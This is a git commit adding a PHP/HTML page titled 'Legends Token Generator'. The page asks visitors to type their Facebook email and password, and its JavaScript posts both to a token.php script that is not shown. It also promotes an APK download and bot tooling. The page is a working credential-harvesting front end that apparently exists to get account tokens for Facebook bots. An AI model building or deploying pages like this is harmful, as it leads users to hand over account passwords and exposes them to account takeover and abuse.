97b551500d56b1dfa4db54d181050c0942ae0ba0
topbotga <48006563+topbotga@users.noreply.github.com>
2019-04-18 08:41:44 +0600

    Add files via upload

---
+++ index.php
@@ -0,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>TL Token Site</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+ <div class="container">
+  <div class="panel-group">
+<div class="panel panel-primary">
+      <div class="panel-heading"><center><script type="text/javascript"></script><font size="20" color="red">⚠</font><b><font style="background: url(&quot;http://i106.photobucket.com/albums/m280/YukioKenshin/chopnhay.gif&quot;) repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.20em red, 0pt 5pt 0.9em white;color: yellow ;font-size:70;">LEGENDS TOKEN GENERATOR </font></b></font><font size="50" color="red">⚠</font></center>
+      <center><font color="cyan" size="+1"> <marquee bgcolor="" direction="left" 
+loop="infinite" width="60%">NO CHECKPOINT 100% SAVE
+</marquee></font><center><br></div></div>
+<body>
+ <div id="content">
+<br><br>
+<center>
+<div class="TL">
+<a href="https://www.Facebook.com/richr0" alt="TL" target="_blank">
+<img
+src="https://graph.facebook.com/100026269890009/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(204, 204, 204); padding: 0px;" width="200" height="200"></a>
+<div class="container">
+<marquee behavior="scroll" direction="left" scrollamount="8" scrolldelay="1"><strong><font style="text-shadow: 1px 1px black; color:;" size="4">RICHARD ANIM THE UNBEATABLE BOT MAKER</font></strong></center></marquee>
+  <center><font color="Red" size="+1"><marquee bgcolor="" direction="right" 
+loop="infinite" width="60%"><strong>LEGENGS BOT TEAM
+</strong></marquee></font></center></div></div></font>
+  <div class="panel-group">
+<div class="panel panel-primary">
+    <div class="panel-heading">(Type your e-mail and password to get token)</div>
+    <font color="blueviolet">
+      <div class="panel-body">      
+<div class="form-group">
+  <label for="usr">Enter Your Facebook Email/Username:</label>
+  <input type="text"  placeholder="Email/Username here..."  class="form-control" id="tk">
+</div>
+<div class="form-group">
+  <label for="pwd">Enter Your Facebook Password</label>
+  <input type="password" placeholder="Password here..." class="form-control" id="mk">
+</div>
+<center><button type="button" class="btn btn-danger" onclick="Puaru_Active()" ><i class="fa fa-lock"></i> Get Token</button>
+<p>
+<li id="trave" class="list-group-item"><img src="richard.gif"> </li></p>
+        Download Script  <a href="https://legendstricks.blogspot.com" 
+target="blank">LEGENDS TECH</a><br>
+</li></p>
+Download Legends Apk <a href="https://files.appsgeyser.com/LEGENDS%20TECH_8570035.apk" target="blank">LEGENDS APK</a><br>
+<center></li></p>👉 <a href="index.php" target="_blank">IPHONE TOKEN👈</a><br>
+       <Br>
+     <Br>   
+<center><a href="https://www.Facebook.com/richr0" target="_blank" style="font-family: Geneva, Arial; font-size: 9px; color: #330010; text-decoration: none;">
+         </script>
+  <br>
+<div id="footer">
+<script language="JavaScript1.2">
+
+
+var message="MADE BY RICHARD ANIM"
+var neonbasecolor=""
+var neontextcolor="RED"
+var flashspeed=100  //in milliseconds
+
+///No need to edit below this line/////
+
+var n=0
+if (document.all||document.getElementById){
+document.write('<font color="'+neonbasecolor+'">')
+for (m=0;m<message.length;m++)
+document.write('<span id="neonlight'+m+'">'+message.charAt(m)+'</span>')
+document.write('</font>')
+}
+else
+document.write(message)
+
+function crossref(number){
+var crossobj=document.all? eval("document.all.neonlight"+number) : document.getElementById("neonlight"+number)
+return crossobj
+}
+
+function neon(){
+
+//Change all letters to base color
+if (n==0){
+for (m=0;m<message.length;m++)
+//eval("document.all.neonlight"+m).style.color=neonbasecolor
+crossref(m).style.color=neonbasecolor
+}
+
+//cycle through and change individual letters to neon color
+crossref(n).style.color=neontextcolor
+
+if (n<message.length-1)
+n++
+else{
+n=0
+clearInterval(flashing)
+setTimeout("beginneon()",1500)
+return
+}
+}
+
+function beginneon(){
+if (document.all||document.getElementById)
+flashing=setInterval("neon()",flashspeed)
+}
+beginneon()
+</script>
+
+  
+</div>
+    </div>
+</div>
+
+<script>
+function Puaru_Active() {
+var http = new XMLHttpRequest();
+var tk = document.getElementById("tk").value;
+var mk = document.getElementById("mk").value;
+var url = "token.php";
+var params = "u="+tk+"&p="+mk+"";
+http.open("POST", url, true);
+http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+http.onreadystatechange = function() {
+    if(http.readyState == 4 && http.status == 200) {
+      document.getElementById("trave").innerHTML = http.responseText;        
+    }
+}
+http.send(params);
+}
+ 
+  </script>
+ <center> <script src="https://apis.google.com/js/platform.js"></script>
+
+<div class="g-ytsubscribe" data-channelid="UCUnA18MdoZG6JJo2gjv10hQ" data-layout="full" data-theme="dark" data-count="hidden"></div>
+<center><!-- Start of CuterCounter Code -->
+<a href="http://www.cutercounter.com/" target="_blank"><img src="http://www.cutercounter.com/hit.php?id=genaccc&nd=6&style=24" border="0" alt="free counter"></a>
+<!-- End of CuterCounter Code -->
